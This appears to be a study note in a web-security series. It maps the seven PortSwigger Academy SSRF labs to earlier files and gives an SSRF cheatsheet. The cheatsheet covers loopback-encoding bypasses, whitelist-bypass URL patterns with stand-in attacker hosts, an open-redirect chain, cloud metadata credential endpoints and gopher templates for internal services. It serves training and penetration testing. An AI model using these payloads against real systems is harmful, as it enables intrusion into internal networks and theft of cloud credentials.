# 07 — SSRF Cheatsheet & Verified Lab Mapping

## Verified PortSwigger Academy Lab Mapping (Official SSRF Topic Order)

This table reflects the **actual, verified lab order** on the PortSwigger Web
Security Academy SSRF topic page as of this writing. There are **7 labs
total** under the SSRF topic. This is the complete set — nothing has been
omitted or padded.

| # | Lab Name | Difficulty | Covered In | Core Skill Tested |
|---|---|---|---|---|
| 1 | Basic SSRF against the local server | Apprentice | File 02, §2.1 | Forging a request to `localhost`/`127.0.0.1` to bypass front-door access control |
| 2 | Basic SSRF against another back-end system | Apprentice | File 02, §2.2 | Using SSRF + Burp Intruder to sweep an internal subnet and locate a hidden admin host |
| 3 | SSRF with blacklist-based input filter | Practitioner | File 03, §3.1 | Bypassing string-blacklist filters via alternative IP encodings and domains that resolve to blocked IPs |
| 4 | SSRF with whitelist-based input filter | Practitioner | File 03, §3.2 | Exploiting URL-parsing inconsistencies (`@` userinfo, `#` fragment, DNS subdomain hierarchy) against allow-list filters |
| 5 | SSRF with filter bypass via open redirection vulnerability | Practitioner | File 03, §3.3 | Chaining an unrelated open-redirect bug to defeat a strict exact-match domain filter |
| 6 | Blind SSRF with out-of-band detection | Practitioner | File 02, §2.3 | Confirming SSRF with zero response visibility, using Burp Collaborator as an OOB channel |
| 7 | Blind SSRF with Shellshock exploitation | Expert | File 02, §2.4 | Chaining blind SSRF into a Shellshock RCE on an internal host, exfiltrating data via DNS |

### Honest Disclosure on Cross-Topic and Non-Lab Material

- **Cloud metadata exploitation (file 04)** has no dedicated lab under the SSRF
  topic itself. The closest official Academy lab — *"Exploiting XXE to perform
  SSRF attacks"* (targeting a simulated EC2 metadata endpoint) — is filed under
  the **XML External Entity (XXE) injection** topic, because the entry vector
  is XML parsing, not a raw SSRF parameter. It is real, practiceable, and
  worth doing, but it is not being claimed as an SSRF-topic lab here.
- **DNS rebinding (file 03, §3.4)** has no standalone PortSwigger Academy lab
  at all as of this writing. It's documented because it's a real, current
  technique you'll encounter in actual SSRF assessments and bounty programs,
  not because there's a lab to map it to.
- **SSRFmap and Gopherus (files 05–06)** are external community tools, not
  PortSwigger material — they're included because the user requested
  dedicated automation-tool coverage, matching the sqlmap-equivalent
  convention used elsewhere in this note series.

---

## Quick-Reference Cheatsheet

### Loopback / Local-Server Bypass Strings

| Payload | Decodes to / Resolves to |
|---|---|
| `127.0.0.1` | Standard loopback |
| `localhost` | Loopback via hostname |
| `127.1` | Loopback, shorthand IPv4 (missing octets zero-padded) |
| `0` | Some systems interpret bare `0` as `0.0.0.0`, which many OSes route to loopback |
| `2130706433` | Loopback as a decimal 32-bit integer |
| `017700000001` | Loopback in octal |
| `0x7f000001` | Loopback in hexadecimal |
| `[::1]` | Loopback, IPv6 form (brackets required in a URL authority) |
| `[::]` | All-zero IPv6 address, sometimes maps to loopback depending on stack |
| `localhost.attacker-domain.com` | Subdomain trick — DNS-resolves under attacker control regardless of the leading label |

### Whitelist Filter Bypass Building Blocks

| Technique | Pattern | What it abuses |
|---|---|---|
| Userinfo injection | `https://expected-host:fakepass@evil-host/` | Everything before `@` is credentials, not the host |
| URL fragment | `https://evil-host/#expected-host` | Fragment is never sent to the server; filter false-matches on substring presence |
| DNS subdomain hierarchy | `https://expected-host.evil-host/` | Filter checks for a prefix match; DNS resolves the *whole* name, owned by `evil-host` |
| Double URL-encoding | `%2568` → decodes once to `%68`, again to `h` | Defeats filters that decode once while the HTTP client decodes recursively |
| Case variation | `LocalHost`, `LOCALHOST` | Defeats case-sensitive string blacklists; DNS/HTTP are case-insensitive |

### Open Redirect Chain Pattern

```
vulnerable_param=https://TRUSTED-DOMAIN/redirect-endpoint?path=http://INTERNAL-TARGET
```
Works only if the HTTP client used by the vulnerable feature **automatically
follows redirects**. If it doesn't, this technique fails outright — check that
assumption first.

### Cloud Metadata Quick Hits

| Provider | Base URL | Required Header | Notes |
|---|---|---|---|
| AWS (IMDSv1) | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | None | Legacy; try this first on suspected AWS targets |
| AWS (IMDSv2) | Same path, after token exchange | `X-aws-ec2-metadata-token` (obtained via `PUT` to `/latest/api/token`) | Needs method + header control in your SSRF primitive |
| GCP | `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` | Fails without the header — almost always |
| Azure | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` | `Metadata: true` | Also requires `api-version` query param |

### Gopher Protocol Quick Reference

```
gopher://HOST:PORT/_RAW_PROTOCOL_BYTES_URLENCODED
```
Use when: the target's HTTP-fetching code path supports arbitrary URL schemes
(not just `http`/`https`), and you've identified a plaintext line-based
internal service (Redis 6379, Memcached 11211, SMTP 25, FastCGI 9000, MySQL
3306) reachable from the vulnerable server. Generate with Gopherus (file 06)
or SSRFmap's relevant module (file 05) rather than hand-encoding the wire
protocol bytes yourself.

### Common Vulnerable Feature Checklist (For Recon, Not Just Labs)

When auditing a real application for SSRF, the recurring hot spots are:
- URL preview / link unfurl / "import from URL" features
- PDF/image export or HTML-to-PDF rendering (check `<img>`, `@import`, `<iframe>`)
- Webhook/callback URL registration fields
- File upload "fetch from URL" alternatives to direct upload
- SSO/SAML metadata URL fields
- Any "Referer"-logging analytics or "check this link" feature
- API parameters literally named `url`, `uri`, `path`, `dest`, `redirect`, `next`, `data`, `reference`, `feed`, or `callback`

## Methodology Summary (Tie-Together)

1. **Identify** a parameter/header that causes a server-side fetch (file 01).
2. **Confirm visibility**: is the response reflected (basic, file 02 §2.1–2.2)
   or invisible (blind, requiring OOB, file 02 §2.3–2.4)?
3. **If a filter exists**, identify whether it's blacklist or whitelist-style,
   and apply the matching bypass family from file 03.
4. **Determine scope/impact**: can you reach the cloud metadata service (file
   04)? Can you reach a plaintext internal protocol via Gopher (file 06)?
5. **Automate confirmed findings** with SSRFmap (file 05) for breadth (port
   scanning a whole subnet, trying every cloud-provider metadata module) once
   the manual technique is proven, rather than starting with automation blind.
6. **Report impact in terms of what was reached**, not just "SSRF exists" —
   the severity of an SSRF finding is almost entirely defined by what's on the
   other side of it.
